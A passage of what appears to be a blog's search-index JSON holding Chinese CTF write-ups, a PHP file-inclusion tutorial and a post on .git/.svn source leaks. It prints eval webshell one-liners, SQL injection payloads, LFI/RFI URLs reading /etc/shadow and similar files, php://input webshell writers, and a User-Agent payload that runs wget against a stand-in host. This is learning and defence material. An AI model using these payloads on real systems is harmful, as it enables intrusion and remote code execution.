写在后面就先总结这么多。。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"i春秋","slug":"i春秋","permalink":"https://qwzf.gitee.io/blog/tags/i春秋/"}],"author":"qwzf"},{"title":"南邮-Web(二)","slug":"南邮-Web(二)","date":"2019-08-25T10:31:58.716Z","updated":"2019-08-25T11:48:41.025Z","comments":true,"path":"2019/08/25/南邮-Web(二)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/08/25/南邮-Web(二)/","excerpt":"","text":"前言最近又做了南邮的Web题，发现有的题崩了。不过已经把未崩的Web题做完了，再次总结一下 Web15：伪装者题目没有提示。点进去发现发现只能本地登录，才能得到flag。所以进行IP欺骗，即可得到flag。一般情况下是XFF(X-Forwarded-For)请求伪造。不过这道题试过之后，发现并没有什么用。查询百度：IP欺骗(XFF头等)由此，可以使用Client-IP: 127.0.0.1进行本地IP欺骗。伪造之后，Forword发包，得到flag Web16：Header发现题崩了，不过我下载过源码，所以本地搭建做一下根据题目描述，很明显想到http请求头和响应头。截包发现flag在响应头里 Web17：上传绕过由题目描述，可以知道这道题考察的是文件上传漏洞。因为之前总结过，所以直接开始做题。先随便上传一个文件，发现要求上传php后缀的文件然后写一个php的一句话木马：&lt;?php @eval($_POST['a']); ?&gt; 再上传php文件绕过思路：先将webshell.php的.php后缀改为.png。然后上传该png文件，绕过黑名单，再将.png后缀变为.php。最后再去掉.php由此想到了00截断进行绕过，并且是POST型的。先上传webshell.png，在/uploads/后加上webshell.php+空格然后将空格0x20改为0x00forward发包，得到flag Web18：SQL注入1根据题目描述，很明显是SQL注入。点击Source，查看源码发现当SQL查询有返回值，且user=”admin”时，即可得到flag。并且闭合方式为&#39;)所以构造payload：admin')# Web19：pass check strcmp() 函数 strcmp() 函数比较两个字符串。strcmp() 函数是二进制安全的，且区分大小写。 该函数返回： 0 - 如果两个字符串相等 0 - 如果 string1 大于 string2 代码审计一下：1、post传参，且参数变量为pass，赋值给变量$pass。变量$pass1的值被隐藏。2、如果设置了$pass，且strcmp() 函数返回0，即可得到flag。3、要使strcmp() 函数返回0。可以$pass==$pass1，也可以strcmp(array,string)=null=04、所以使strcmp返回NULL就可以得到flag Web20：起名字真难ord()函数代码审计一下：1、get传参，参数值通过自定义函数进行检查，对参数值的每一位进行检查。2、如果ascii码&gt;=1的ascii且&lt;=9的ascii，返回false。即题目要求不能输入1-9数字，3、但是输入的字符串必须和54975581388相同4、所以可以用和54975581388等值的16进制表示(利用了php的弱类型的特性)10进制转16进制get传参，得到flag Web21：密码重置题目提示账号为admin，要进行密码重置。打开题目账号无法修改，只能重置账号ctfuser。所以抓包修改发现Y3RmdXNlcg==比较特殊，是Base64加密的，解密结果发现是ctfuser所以想着把admin进行Base64加密，Y3RmdXNlcg==替换成admin加密结果Forward发包，得到flag Web22：php 反序列化反序列化？！还好已经学习过。审计代码，开始做题代码审计一下：1、stripslashes()函数的作用是删除反斜杠，代码的意思是如果添加了反斜杠，则将反斜杠\\删除。if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass);&#125; 2、然后将pass进行反序列化操作，并赋值给变量o。$o = unserialize($pass)； 3、如果对象o赋值成功，将对象o的secret变量设置为*，并判断对象o的secret变量和enter变量是否相等，===判断数值及属性，如果相等输出flag。if ($o) &#123; $o-&gt;secret = \"*\"; if ($o-&gt;secret === $o-&gt;enter) echo \"Congratulation! Here is my secret: \".$o-&gt;secret; else echo \"Oh no... You can't fool me\";&#125; 不知道secret的值。所以我们想到了引用a=&amp;b，即PHP对象深浅拷贝构造POC(在初始化的时候将$this-&gt;enter=&amp;$this-&gt;secret进行引用)：&lt;?php class just4fun &#123; var $enter; var $secret; function just4fun() &#123; $this-&gt;enter=&amp;$this-&gt;secret; &#125; &#125;echo serialize(new just4fun());?&gt; 得到序列化字符串O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}构造payload得到flag(N表示NULL，R表示对象引用)：提交flag发现不对，因为题有问题。。。。。。。PHP序列化格式详解：a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - unicode string Web23：SQL Injection题目提示：反斜杠可以用来转义，仔细查看相关函数的用法打开题目，查看源码magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。单引号（’）、双引号（”）、反斜线（\\）与 NULL（NULL 字符）等字符都会被加上反斜线。这些转义是必须的，如果这个选项为Off，那么我们就必须调用addslashes这个函数来为字符串增加转义。stripslashes() 函数删除反斜杠htmlentities() 函数把字符转换为 HTML 实体htmlentities($str, ENT_COMPAT); // 只转换双引号htmlentities($str, ENT_QUOTES); // 转换双引号和单引号htmlentities($str, ENT_NOQUOTES); // 不转换任何引号 代码审计一下：1、传入GET类型的username以及password，首先调用了clean方法2、clean方法首先判断是否开启了添加反斜杠，如果添加了，使用stripslashes()删除反斜杠，然后调用htmlentities()方法将把字符转换为 HTML 实体,htmlentities($str, ENT_QUOTES); // 转换双引号和单引号3、因为带反斜杠的单引号，被转义为字符了，无法参与闭合操作。下一步考虑的是将单引号闭合4、可以通过反斜杠对单引号进行转义。当我们输入username=admin&amp;password=123时，会将username后的单引号进行转义，构造语句如下：SELECT * FROM users WHERE name=&lt;font color=#FF0000 size=3&gt;'&lt;/font&gt;admin' AND pass=&lt;font color=#FF0000 size=3&gt;'&lt;/font&gt;123' 所以将第一个单引号和第三个单引号进行闭合。SELECT * FROM users WHERE name=&lt;font color=#FF0000 size=3&gt;'&lt;/font&gt;admin' AND pass=&lt;font color=#FF0000 size=3&gt;'&lt;/font&gt; or 1 #' payload?username=admin\\&amp;password=or 1 %23 或?username=admin\\&amp;password=or 1=1--+ Web24：综合题题目描述没提示，查看题目我也不知道是什么玩意儿。不过之前做过颜文字aaencode，看着两者比较像，想着是不是可以用谷歌的Console，发现可以。不过还是了解一下这是什么编码。看大佬博客发现这是jsfuck编码。可使用浏览器控制台直接解密，也可使用在线JSfuck解密工具。访问得到的php文件提示：TIP在我脑袋里，在文件的header里发现了history of bash百度一下history of bash。发现在Unix中 , 会生成一个 .bash_history 的文件 , 记录了用户的操作历史尝试访问这个文件 :在bash_history中记录了执行压缩包的操作，所以我们访问以下flagbak.ziphttp://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip开始自动下载文件，打开后得到flag！system题崩了。。。 Web25：SQL注入2题目提示union查询。打开题目，点击Source，查看源码strcasecmp() 函数strcasecmp(string1,string2)比较两个字符串。该函数返回： 0 - 如果两个字符串相等 0 - 如果 string1 大于 string2 代码审计一下：1、post传入user赋值给$user，传入pass经md5加密赋值给$pass2、$query等于查询pw字段返回结果。如果有返回值，则$query[pw]为ture，否则为false3、如果变量存在，并且，$pass与$query[pw]相等（不区分大小写）,输出flag所以考虑在$user上加上一个union语句，即向$query的结果集中在加一条。payload' union select md5(123)#&amp;pass=123 Web26：密码重置2依旧是密码重置，题目有三条提示： 管理员邮箱观察一下就可以找到 linux下一般使用vi编辑器，并且异常退出会留下备份文件 弱类型bypass 查看源码，发现管理员邮箱百度一下，vi编辑器异常退出会留下的备份文件：第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。由此再次查看源码发现submit.php，所以访问.submit.php.swp，得到验证源码代码审计一下：$token长度为10，数值为0，并且邮箱号和token不为空。所以输入刚才的管理员邮箱，token为0000000000最终，得到flag Web27：file_get_contents题目标题file_get_contents，想到之前学文件包含漏洞时遇到过file_get_contents() 函数把整个文件读入一个字符串中。打开题目查看源码传入一个文件，经file_get_contents() 函数把整个文件读入一个字符串中，如果字符串等于meizijiu，得到flag。想到了学文件包含漏洞时的php伪协议这里应该是php://input (读取POST数据)。file_get_contents(“php://input”)的使用方法php伪协议也是可以利用http协议的，即可以使用POST方式传数据 Web28：变量覆盖提示：变量覆盖打开题目，查看源码emmm。。。不会，查看大佬博客分析代码：可变变量key获取了一个普通变量value的值作为这个可变变量的变量名。使用foreach来遍历数组中的值，再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。通过地址栏进行GET传参，变量覆盖便形成了$$key = $name$value = meizijiu233$name == \"meizijiu233\" 所以得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"南邮","slug":"南邮","permalink":"https://qwzf.gitee.io/blog/tags/南邮/"}],"author":"qwzf"},{"title":"文件包含漏洞","slug":"文件包含漏洞","date":"2019-08-21T13:28:09.505Z","updated":"2019-08-21T13:44:24.663Z","comments":true,"path":"2019/08/21/文件包含漏洞/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/08/21/文件包含漏洞/","excerpt":"","text":"前言因为之前做过文件包含漏洞的Web题，了解了一点文件包含漏洞的一些知识，但并没有总结。所以现在重新学习并总结了一下文件包含漏洞。 文件包含漏洞文件包含的简介 服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。 文件包含的原理 PHP中提供了四个文件包含的函数，分别是include()、include_once()、require()和require_once()。这四个函数都可以进行文件包含，但作用并不一样。 require：找不到被包含的文件时会产生致命错误，并停止脚本。 include：找不到被包含的文件时只会产生警告，脚本将继续执行。 include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 文件包含的分类PHP中的文件包含分为本地包含和远程包含。1、本地包含 Local File Include (LFI) 1.所包含文件内容符合PHP语法规范：任何扩展名都可以被PHP解析。2.包含非PHP语法规范源文件，会暴露其源代码。 例如：test1.php代码如下：&lt;?php$a='abc';echo $a; ?&gt; test2.php代码如下：&lt;?php include(\"test1.php\"); ?&gt; 执行test2.php，会输出 abc。 如果test2.php包含的是一个 txt文件，并且这个txt文件内容符合php语法规则，则txt文件会被当成php文件执行。如果包含非php语法规则的内容，则会暴露其源代码。 2、远程包含 Remote File Include (RFI)如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。 远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。 例如：创建abc.txt文件，文件内容符合PHP语法规则。我们将test2.php的内容修改为：&lt;?php include($_GET['page']); ?&gt; 此时，在url中输入：http://www.XXXX.com/test2.php?page=http://www.XXXX.com/abc.txt将会执行abc.txt的内容。 文件包含漏洞的成因 在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值可控而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在PHP语言中。例如：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; $_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET[&#39;filename&#39;]的值，执行非预期的操作。 文件包含漏洞的危害 通过文件包含漏洞，可以读取系统中的敏感文件，源代码文件等，如密码文件，通过对密码文件进行暴力破解。若破解成功则可获取操作系统的用户账户，甚至可通过开放的远程连接服务进行连接控制。另外不管是本地文件包含还是远程文件包含，文件包含漏洞还可能导致执行任意代码。 文件包含漏洞分类1、本地文件包含漏洞 当包含的文件在服务器本地时，就形成了本地文件包含。 1.无限制本地文件包含漏洞测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 测试结果：通过目录遍历漏洞可以获取到系统中其他文件的内容。 常见的敏感信息路径：Windows系统 c:\\boot.ini // 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini // MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码c:\\windows\\php.ini // php 配置信息 Linux/Unix系统 /etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 2.session文件包含漏洞条件：session的存储位置可以获取。session存储位置的获取 1、通过phpinfo的信息可以获取到session的存储位置。通过phpinfo的信息，获取到session.save_path为/var/lib/php/sessions：2、 通过猜测默认的session存放位置进行尝试。 linux下默认存储在/var/lib/php/session(s)目录下。windows下(如果用的是phpstudy集成环境，且phpstudy在C盘根目录的话)默认存储在C:\\phpStudy\\PHPTutorial\\tmp\\tmp session中的内容可以被控制，传入恶意代码。示例代码：&lt;?phpsession_start();$ctfs=$_GET['ctfs'];$_SESSION[\"username\"]=$ctfs;?&gt; 漏洞分析 此php会将获取到的GET型ctfs变量的值存入到session中。当访问http://www.XXXX.com/LFI2.php?ctfs=ctfs 后，会在/var/lib/php/sessions目录下存储session的值。session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。所以session的文件名为sess_aisf1tieidskl22nlc4hqf60h5。到服务器的/var/lib/php/sessions目录下查看果然存在此文件，内容为：漏洞利用 通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。 当访问http://www.XXXX.com/LFI2.php?ctfs=&lt;?php phpinfo();?&gt;后，会在/var/lib/php/sessions目录下存储session的值。本地查看是否存储成功攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。当然也可以把&lt;?php phpinfo();?&gt;换成一句话木马&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;： 3.有限制本地文件包含漏洞测试代码：&lt;?php$filename = $_GET['filename'];include($filename . \".html\");?&gt; 1、%00截断 条件：magic_quotes_gpc = Off php版本&lt;5.3.4测试结果： http://www.filename.com/LFI3.php?filename=phpinfo.php%00 2、路径长度截断 条件：windows OS，点号需要长于256；linux OS 长于4096 Windows下目录最大长度为256字节，超出的部分会被丢弃；Linux下目录最大长度为4096字节，超出的部分会被丢弃。 EXP：http://www.filename.com/LFI3.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 3、点号截断 条件：windows OS，点号需要长于256EXP：http://www.filename.com/LFI3.php?filename=test.txt................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. 2、远程文件包含漏洞PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 allow_url_fopen = On(是否允许打开远程文件)allow_url_include =On(是否允许include/require远程文件) 1.无限制远程文件包含漏洞测试代码：&lt;?php$filename = $_GET[&apos;filename&apos;];include($filename);?&gt; 测试结果：通过远程文件包含漏洞，包含php.txt可以解析。http://www.filename.com/RFI1.php?filename=http://192.168.204.128/wenjian/php.txt 2.有限制远程文件包含漏洞测试代码：&lt;?php$filename = $_GET['filename'];include($filename . \".html\");?&gt; 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。 1、问号绕过 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt? 2、#号绕过 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%23 还有哪些可以绕过？用burp跑一遍发现空格也可以绕过： 3、空格绕过 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%20 使用windows环境(把测试代码放在windows的Web目录下)测试失败 4、%00截断 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%00 同样，把php.txt文件内容换成一句话木马&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;，可拿到webshell。 PHP伪协议PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 php:// 输入输出流PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://filter(本地磁盘文件进行读取)元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。用法： ?filename=php://filter/convert.base64-encode/resource=xxx.php?filename=php://filter/read=convert.base64-encode/resource=xxx.php 两者效果一样。条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 测试结果：php://input可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。用法：?file=php://input 数据利用POST传过去。 php://input (读取POST数据)碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；测试代码：&lt;?phpecho file_get_contents(\"php://input\");?&gt; 测试结果： php://input(写入木马)测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。 &lt;?PHP fputs(fopen(‘webshell.php’,’w’),’&lt;?php @eval($_POST[a])?&gt;’);?&gt; 测试结果： php://input(命令执行)测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；测试结果： file://伪协议 (读取文件内容)通过file协议可以访问本地文件系统，读取到文件的内容。不受allow_url_fopen与allow_url_include的影响。测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 用法：file://文件绝对路径 file://C:/Windows/system.ini 测试结果：data://伪协议数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 data://(读取文件)和php伪协议的input类似，碰到file_get_contents()来用； &lt;?php // 打印 “I love PHP” echo file_get_contents(‘data://text/plain;base64,SSBsb3ZlIFBIUAo=’); ?&gt; 注意：&lt;span style=\"color: rgb(121, 121, 121);\"&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;闭合; 如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI）测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 测试结果： phar://伪协议这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。用法：?file=phar://压缩包/内部文件 phar://xxx.png/webshell.php注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件webshell.php，然后用zip协议压缩为webshell.zip，然后将后缀改为png等其他格式。测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 测试结果： zip://伪协议zip伪协议和phar协议类似，但是用法不一样。用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#webshell.php。条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。测试代码：&lt;?php$filename = $_GET['filename'];include($filename);?&gt; 测试结果： 文件包含漏洞利用（一）读取敏感文件 （二）远程包含shell allow_url_fopen为ON时，可以尝试远程包含一句话木马。访问http://www.xxx.xom/index.php?page=http://www.filename.com/echo.txt，远程http://www.filename.com/下的echo.txt文件内容为： &lt;?fputs(open(\"webshellshell.php\",\"w\"),\"&lt;?php @eval($_POST[a]);?&gt;\")?&gt; （三）本地包含配合文件上传 上传一句话图片木马，得知图片路径(/upload/1.jpg)，图片代码为：&lt;?fputs(open(\"webshell.php\",\"w\"),\"&lt;?php @eval($_POST[a]);?&gt;\")?&gt; 访问http://www.xxx.xom/index.php?page=./upload/1.jpg，包含这张图片并在index.php所在目录生成webshell.php。 （四）使用PHP封装协议 PHP带有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exists()、file size()等文件系统函数所提供的功能类似。1、使用封装协议读取PHP文件： http://www.filename.com/RFI1.php?filename=php://filter/read=convert.base64-encode/resource=x.php 2、写入PHP文件： http://www.filename.com/RFI1.php?filename=php://inputpost传参：&lt;?PHP fputs(fopen(‘webshell.php’,’w’),’&lt;?php @eval($_POST[a])?&gt;’);?&gt; 测试一下，写马成功（五）包含Apache日志文件Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。日志默认路径 (1)apache+Linux日志默认路径/etc/httpd/logs/access_log或者/var/log/httpd/access log(2) apache+win2003日志默认路径(3) IIS6.0+win2003默认日志文件 C:WINDOWSsystem32Logfiles(4) IIS7.0+win2003 默认日志文件 %SystemDrive%inetpublogsLogFiles(5) nginx 日志文件在用户安装目录的logs目录下。如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里。也可通过其配置文件Nginx.conf，获取到日志的存在路径(/opt/nginx/logs/access.log) web中间件默认配置 (1) apache+linux 默认配置文件/etc/httpd/conf/httpd.conf或者index.php?page=/etc/init.d/httpd(2)IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml(3)IIS7.0+WIN 配置文件 C:WindowsSystem32inetsrvconfigapplicationHost.config （六）截断包含只适用于magic_quotes_gpc=off的情况，如果为on，%00（NULL）将会被转义，从而无法正常截断。（七）绕过WAF防火墙（八）包含session参考本地文件包含漏洞：session文件包含漏洞（九）包含/proc/self/environ文件 利用条件：1、php以cgi方式运行，这样environ才会保持UA头。2、environ文件存储位置已知，且environ文件可读。 姿势：proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。 之后再包含它，即可。?file=../../../../../../../proc/self/environ 选择User-Agent 写代码如下：&lt;?system('wget http://www.yourweb.com/oneword.txt -O webshell.php');?&gt; 然后提交请求。（十）包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临 时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。方法一：进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有 65535中不同的文件名，所以这个方法是可行的。方法二：phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell 文件包含漏洞防御 1、严格判断包含中的参数是否外部可控。2、路径限制3、包含文件验证4、尽量不要使用动态包含，可以在需要包含的页面固定写好5、PHP 中使用 open_basedir 配置限制访问在指定的区域6、过滤.（点）/（反斜杠）\\（反斜杠）7、禁止服务器远程文件包含 绕过有防御的本地文件包含&lt;?php$file = $_GET['file'];include '/var/www/html/'.$file.'/test/test.php'; ?&gt; 这段代码指定了前缀和后缀:这样就很“难”直接去包含前面提到的种种文件。 绕过有防御的远程文件包含&lt;?php$basePath = $_GET['path'];require_once $basePath . \"/action/m_share.php\"; ?&gt; 参考博客：文件包含漏洞文件包含漏洞学习总结 写在后面学文件包含漏洞，了解了php伪协议和文件包含漏洞的基础知识。收获很大，继续努力。小白进阶ing","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"文件包含漏洞","slug":"文件包含漏洞","permalink":"https://qwzf.gitee.io/blog/tags/文件包含漏洞/"}],"author":"qwzf"},{"title":"常见Web源码泄露","slug":"常见Web源码泄露","date":"2019-08-15T12:03:10.941Z","updated":"2019-08-15T12:43:37.566Z","comments":true,"path":"2019/08/15/常见Web源码泄露/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/08/15/常见Web源码泄露/","excerpt":"","text":"写在前面源码泄露漏洞成因把网站部署在某一个虚拟主机上面，然后把代码先打包压缩后上传，上传成功后再去服务器解压。虽然解决了上传速度慢的问题。但压缩包解压后如果没有删除，当攻击者发现后就可以把代码压缩包下载；因为部署到服务器上的都是源代码，这时候攻击者就可以通过代码进一步挖掘一些安全漏洞：文件上传，SQL 注入等等。 0x01 .git源码泄漏当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。该目录的结构：HEAD config* description hooks/ info/ objects/ refs/ description 文件仅供 GitWeb 程序使用，无需关心。 config 文件包含项目特有的配置选项； info 目录包含一个全局性排除(global exclude)文件，用以放置不希望被记录在 .gitignore文件中的忽略模式(ignored patterns)； hooks 目录包含客户端或服务端的钩子脚本(hook scripts) 下面的四个很重要： HEAD 文件指示目前被检出的分支； index 文件保存暂存区信息； objects 目录存储所有数据内容； refs 目录存储指向数据(分支)的提交对象的指针。 1、漏洞成因 在发布代码的时候，如果没有把 .git 这个目录删除，直接发布到了运行目录中。攻击者就可以通过这个文件夹，可以用来恢复源代码。eg： http://www.example.com/.git/ 2、漏洞利用 常规利用下载整个目录, 然后用git命令回滚整个项目: wget -r --no-parent --mirror http://www.example.com/.gitcd www.example.com &amp;&amp; git reset --hard 工具GitHack GitHack.py http://www.example.com/.git/ dvcs-ripperrip-git.pl -v -u http://www.example.com/.git/ 3、修复建议 1.删除.git2.在Nginx添加中URL重写判断来禁止访问这个.git目录下的内容： rewrite ^/.git/ http://www.example.com/; #Fix git issues 配置WEB服务器(apache/nginx等)来拒绝对.git路径的访问, 但也会出现被意外绕过的风险.最好的办法就是在项目新建一个www目录来存放源代码文件. 0x02 .hg源码泄漏Mercurial的意思是水银，所以缩写成hg(汞), 也是一个版本管理软件.。用法和git有点类似,，但也保留了svn命令简明的特点，而且原生地支持Windows/MacOS/Linux三大平台， 不像git需要MinGW才得以运行,，所以当今也有不少人偏向于用hg做版本控制。 1、漏洞成因 hg init的时候会生成.hgeg：http://www.example.com/.hg/ 2、漏洞利用 工具dvcs-ripper rip-hg.pl -v -u http://www.example.com/.hg/ 3、修复建议 删除.hg 0x03 .svn源码泄漏SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。很多网站都使用了SVN版本控制系统，和使用 git 版本控制器类似。 1、漏洞成因 在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但开发者在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境。 攻击者可以借助其中包含的用于版本信息追踪的entries文件，逐步摸清站点结构，并且也可以使用工具 dvcs-ripper下载网站源码。eg：http://www.example.com/.svn/entries 2、漏洞利用 工具 dvcs-ripperrip-svn.pl -v -u http://www.example.com/.svn/ Seay SVN 3、修复建议 1.在web服务器配置文件中增加一段代码，过滤到.svn文件，返回404nginx服务器： location ~ ^(.*)\\/\\.svn\\/&#123;return 404;&#125; 重启nginxApache服务器：Order allow,denyDeny from all 重启Apache 